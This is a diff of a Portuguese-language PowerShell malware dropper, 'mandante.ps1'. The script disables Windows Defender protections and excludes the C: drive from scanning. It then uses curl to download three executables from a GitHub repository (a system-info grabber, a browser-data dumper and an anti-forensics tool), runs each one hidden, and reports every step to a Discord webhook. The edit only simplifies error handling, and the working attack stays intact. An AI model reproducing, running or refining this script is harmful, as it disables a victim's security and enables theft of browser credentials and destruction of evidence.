@@ -1,6 +1,4 @@
-# mandante.ps1 - VERSÃO DEFINITIVA (com curl)
-# Execute como Administrador (já estará elevado)
-
+# mandante.ps1 - VERSÃO COM CURL (DEFINITIVA)
 $TempFolder = $env:TEMP
 
 function Send-DiscordWebhook {
@@ -11,7 +9,6 @@ function Send-DiscordWebhook {
     try { Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop | Out-Null } catch {}
 }
 
-# Desativa Defender
 Send-DiscordWebhook "🛡️ Desativando bloqueio à primeira vista (1/7)"
 Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
 Send-DiscordWebhook "🛡️ Desativando IOAV (2/7)"
@@ -28,49 +25,26 @@ Send-DiscordWebhook "📅 Adicionando exclusão do C:\ (7/7)"
 $drive = [char]67 + ':\'
 Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue
 
-# ==================================================
-# BAIXA OS EXECUTÁVEIS COM CURL (MAIS CONFIÁVEL)
-# ==================================================
 function Download-File {
     param($url, $path)
-    try {
-        curl -L -o $path $url
-        if (Test-Path $path) {
-            Write-Host "Baixado com sucesso: $path"
-            return $true
-        } else {
-            Write-Host "Falha: arquivo não foi criado."
-            return $false
-        }
-    } catch {
-        Write-Host "ERRO no curl: $_"
-        return $false
-    }
+    curl -L -o $path $url
+    return (Test-Path $path)
 }
 
 Send-DiscordWebhook "🖥️ Baixando sysinfo.exe..."
 if (Download-File "https://github.com/gsfv/tro.j/raw/refs/heads/main/sysinfo.exe" "$TempFolder\sysinfo.exe") {
-    Send-DiscordWebhook "🖥️ Executando sysinfo.exe..."
     Start-Process -FilePath "$TempFolder\sysinfo.exe" -Wait -WindowStyle Hidden
-} else {
-    Send-DiscordWebhook "❌ Falha no sysinfo.exe"
-}
+} else { Send-DiscordWebhook "❌ Falha no sysinfo.exe" }
 
 Send-DiscordWebhook "🌐 Baixando dumpbrowserdata.exe..."
 if (Download-File "https://github.com/gsfv/tro.j/raw/refs/heads/main/dumpbrowserdata.exe" "$TempFolder\dumpbrowserdata.exe") {
-    Send-DiscordWebhook "🌐 Executando dumpbrowserdata.exe..."
     Start-Process -FilePath "$TempFolder\dumpbrowserdata.exe" -Wait -WindowStyle Hidden
-} else {
-    Send-DiscordWebhook "❌ Falha no dumpbrowserdata.exe"
-}
+} else { Send-DiscordWebhook "❌ Falha no dumpbrowserdata.exe" }
 
 Send-DiscordWebhook "🧹 Baixando antiforensics.exe..."
 if (Download-File "https://github.com/gsfv/tro.j/raw/refs/heads/main/antiforensics.exe" "$TempFolder\antiforensics.exe") {
-    Send-DiscordWebhook "🧹 Executando antiforensics.exe..."
     Start-Process -FilePath "$TempFolder\antiforensics.exe" -Wait -WindowStyle Hidden
-} else {
-    Send-DiscordWebhook "❌ Falha no antiforensics.exe"
-}
+} else { Send-DiscordWebhook "❌ Falha no antiforensics.exe" }
 
 Send-DiscordWebhook "✅ Processo concluído!"
 exit
